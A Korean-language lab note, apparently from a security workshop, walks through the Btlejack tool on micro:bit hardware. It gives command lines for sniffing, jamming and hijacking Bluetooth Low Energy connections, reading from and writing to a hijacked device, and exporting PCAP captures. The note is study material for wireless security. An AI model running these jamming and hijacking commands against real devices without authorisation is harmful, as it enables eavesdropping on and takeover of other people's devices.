## Btlejack

[깃헙링크](https://github.com/virtualabs/btlejack) [실습참고](https://nis-summer-school.enisa.europa.eu/2018/cources/IOT/nis-summer-school-damien-cauquil-BLE-workshop.pdf)



BLE 디바이스들을 sniff, jam, hijack 할 때 필요한 모든 것을 제공한다.

3개의 마이크로 비트를 연결하면 모든 광고 채널을 스니핑 할 수 있고, 연결 요청을 더 많이 포착할 수 있다.



아래와 같은 일을 할 수 있다.

- 기존 연결 스니핑
- 새로운 연결 감지
- 연결 방해
- 기존 연결 가로채기
- 캡처된 패킷을 PCAP 형식으로 내보내기



어떤 걸 하든 시간이 오래 걸림......



#### 처음 micro:bit 확인

~~~cmd
$ btlejack -i
~~~

![1568851459019](C:\Users\윤소희 팀장\AppData\Roaming\Typora\typora-user-images\1568851459019.png)



#### 기존 연결 스니핑

기존 연결 찾기

~~~cmd
$ btlejack -s
~~~

![1568780540328](C:\Users\윤소희 팀장\AppData\Roaming\Typora\typora-user-images\1568780540328.png)



그 다음 나온 값으로 특정 연결 자세히 보기

~~~cmd
$ btlejack -f 주소
~~~

> ![1568772146653](C:\Users\윤소희 팀장\AppData\Roaming\Typora\typora-user-images\1568772146653.png)
>
> 이정도에서 더 이상 안넘어 가는 경우는 패킷 암호 해독을 구현하지 않아서 암호화 된 LL_CONNECTION_UPDATE_REQ를 포착 할 수 없기 때문이다.
>
> 또한 홉 간격이 너무 크면 홉 증가를 복구할 때 실패할 수 있다. -n 옵션으로 시간 초과 값을 밀리 초 단위로 지정할 수 있다.



#### 새로운 연결 스니핑

새로 만들어진 연결 캡쳐

~~~cmd
$ btlejack -c any
~~~

![1568781602567](C:\Users\윤소희 팀장\AppData\Roaming\Typora\typora-user-images\1568781602567.png)



또는 대상 BD 주소를 지정

~~~cmd
$ btlejack -c 주소
~~~

![1568856688722](C:\Users\윤소희 팀장\AppData\Roaming\Typora\typora-user-images\1568856688722.png)



#### 연결 방해

~~~cmd
$ btlejack -f 액세스주소 -j
~~~



#### 기존 연결 가로채기

~~~cmd
$ btlejack -f 0x9c68fd30 -t -m 0x1fffffffff
~~~

> 실제로는 어떤 값이 들어가는 것인지 확인해 봐야함. 액세스 주소 같음

이렇게 하면 터미널이 *btlejack>* 으로 바뀐다.



아래 세가지 명령으로 하이재킹 된 장치와 상호작용 할 수 있다.



##### 발견 명령

서비스 및 특성 열겨를 수행하고 서비스 및 특성에 대한 모든 정보를 제공

패킷을 송수신하고 모든 서비스 UUID 및 매개 변수와 특성 UUID 및 매개 변수를 검색

~~~cmd
btlejack> discover
~~~



##### 읽기 명령

특정 값 핸들에서 데이터 읽기

단일 매개 변수, 사용자가 읽으려는 특성에 해당하는 값 핸들을 승인

~~~cmd
btlejack> read 0x16
~~~



##### 쓰기 명령

특정 값 핸들에 데이터 쓰기

세 가지 매개 변수를 허용

~~~cmd
btlejack> write <value handle> <data format> <data>
~~~

지원되는 데이터 포맷은 hex (16진 데이터), str (텍스트 문자열) 이다.



#### PACP 파일 내보내기

~~~cmd
$ btlejack -f 0xac56bc12 -x nordic -o capture.nordic.pcap
~~~

Btlejack은 다음과 같은 DLT 형식을 지원

- DLT_BLUETOOTH_LE_LL_WITH_PHDR (동일)
- DLT_NORDIC_BLE (노르딕 스니퍼가 사용하는 것)
- DLT_BLUETOOTH_LE_LL (최신 버전의 Wireshark에서 지원됨)

출력 파일은 -o 옵션을 사용하여 지정할 수 있지만 출력 형식은 -x 옵션을 사용하여 지정할 수 있다. 유효한 형식 값은 ll_phdr, nordic 또는 pcap (기본값) 이다.